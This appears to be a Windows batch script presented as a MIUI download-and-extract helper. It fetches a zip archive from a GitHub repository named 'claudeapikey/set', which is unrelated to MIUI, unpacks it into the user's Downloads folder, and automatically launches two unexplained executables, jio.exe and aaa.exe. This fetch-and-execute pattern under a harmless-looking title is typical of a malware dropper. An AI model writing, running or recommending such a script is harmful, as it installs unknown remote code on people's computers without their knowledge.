
@echo off
setlocal
title MIUI Download and Extract

set "URL=https://raw.githubusercontent.com/claudeapikey/set/main/MIUI.zip"
set "DEST=%USERPROFILE%\Downloads"
set "ZIP=%DEST%\MIUI.zip"
set "EXTRACT=%DEST%\MIUI_Extracted"

if not exist "%DEST%" mkdir "%DEST%"

echo Downloading MIUI.zip...
curl.exe -fL --retry 2 "%URL%" -o "%ZIP%"
if errorlevel 1 (
    echo Download failed.
    pause
    exit /b 1
)

echo Extracting archive...
if not exist "%EXTRACT%" mkdir "%EXTRACT%"
tar.exe -xf "%ZIP%" -C "%EXTRACT%"
if errorlevel 1 (
    echo Extraction failed.
    pause
    exit /b 1
)

echo Looking for executables...

if exist "%EXTRACT%\jio.exe" (
    start "" "%EXTRACT%\jio.exe"
) else (
    echo jio.exe not found in the extraction folder.
)

if exist "%EXTRACT%\aaa.exe" (
    start "" "%EXTRACT%\aaa.exe"
) else (
    echo aaa.exe not found in the extraction folder.
)

echo Finished.
pause
